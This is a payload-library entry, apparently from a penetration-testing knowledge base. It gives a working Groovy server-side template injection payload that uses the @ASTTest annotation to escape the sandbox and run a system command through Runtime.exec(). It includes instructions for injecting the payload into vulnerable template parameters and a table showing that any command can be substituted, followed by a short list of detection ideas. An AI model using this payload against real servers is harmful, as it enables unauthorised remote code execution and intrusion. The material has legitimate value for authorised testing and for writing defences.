---
type: code
language: groovy
verified: true
created_at: '2023-04-06T03:56:39.228722+00:00'
updated_at: '2023-04-10T20:23:43.191640+00:00'
tags:
  - groovy
  - ssti
  - sandbox-bypass
  - rce
platforms:
  - Web
  - Java
validated: true
---

# Groovy-ASTTest-Whoami-Execution

## Code

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

## Description

This Groovy code snippet bypasses the sandbox in an SSTI context by using the @ASTTest compiler annotation to execute the 'whoami' command via Runtime.exec(). It asserts the execution within the annotation, allowing arbitrary command running during template compilation. Primarily used to confirm RCE and identify the executing user on Unix-like systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "whoami" | The system command to execute | "id" (alternative for user/group info) |

## Usage

Inject this payload into a vulnerable Groovy template parameter (e.g., via HTTP request body: template='${payload}'). It executes during server-side rendering. Use for initial foothold verification in web app pentests. Chain with output-capturing techniques if response doesn't reflect results directly.

## Detection

- Monitor application logs for Groovy compilation errors or unexpected @ASTTest annotations.
- Audit process creation for 'whoami' or similar benign commands from web app contexts.
- WAF rules matching Groovy syntax like '@ASTTest' or 'Runtime.getRuntime().exec' in inputs.
- Enable Groovy security manager to log or block annotation-based executions.

## Related

- [[procedures/Groovy-Sandbox-Bypass-for-Server-Side-Template-Injection]]
